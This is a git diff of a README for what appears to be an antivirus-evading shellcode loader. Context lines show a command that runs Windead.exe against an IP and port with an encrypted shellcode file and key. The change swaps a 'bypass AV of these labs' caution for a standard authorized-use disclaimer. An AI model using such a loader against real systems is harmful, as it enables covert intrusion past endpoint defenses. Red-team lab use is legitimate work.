@@ -63,6 +63,6 @@ Windead.exe 192.168.1.46 443 session.enc fb29b4fdb3e278542d0ef5c7d21c1c4153975c8
 - `session.enc` is the file containing the encrypted shellcode
 - `fb29b4....` is the key that was printed out by **ShellCrypt**
 
-# Caution
+# DISCLAIMER
 
-Please, don't be stupid. Use it only for doing red team lab or pro labs. This is the main goal of this tool, being able to bypass AV of these labs.
+This tool is intended for educational purposes and authorized security testing only. I am not responsible for any misuse or damage caused by this tool. Please, always obtain written permission from the owner of the system or network before using this tool.
